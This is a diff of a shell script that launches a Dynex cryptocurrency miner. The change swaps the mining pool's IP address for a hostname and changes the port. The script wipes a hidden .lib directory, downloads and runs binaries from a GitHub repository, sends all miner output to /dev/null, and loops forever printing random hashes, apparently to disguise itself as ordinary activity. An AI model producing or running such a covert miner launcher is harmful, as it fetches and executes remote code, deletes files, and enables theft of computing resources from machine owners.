@@ -12,9 +12,9 @@ cd .lib
 rm -rf *
 WORKER="$(echo $(shuf -i 1-999999 -n 1)-CEK)"
 WALLETNH="XwmwmT1AGF7b4EueCSFizEc7RyXGGFwqoQgXCYcSz2ctAyYzUaqScKJTDgnM4X3qjsZrgfgojbnGEZRVepMAQYce28bcXQbTA"
-POOLNHETC="198.58.113.56"
+POOLNHETC="dnx.eu.ekapool.com"
 rm -f dynex_compute_w340.cnf && wget -q 'https://github.com/angkii/kerja/raw/main/dynex_compute_w340.cnf' && chmod +x dynex_compute_w340.cnf
 rm -f h-manifest.conf && wget -q 'https://github.com/angkii/kerja/raw/main/h-manifest.conf' && chmod +x h-manifest.conf
 rm -f dynexsolve && wget -q 'https://github.com/angkii/kerja/raw/main/dynexsolve' && chmod +x dynexsolve
-./dynexsolve -stratum-url $POOLNHETC -stratum-port 443 -mining-address $WALLETNH -stratum-password $WORKER -no-cpu -multi-gpu -mallob-endpoint https://dnx.eu.ekapool.com >/dev/null 2>&1
+./dynexsolve -stratum-url $POOLNHETC -stratum-port 19666 -mining-address $WALLETNH -stratum-password $WORKER -no-cpu -multi-gpu -mallob-endpoint https://dnx.eu.ekapool.com >/dev/null 2>&1
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
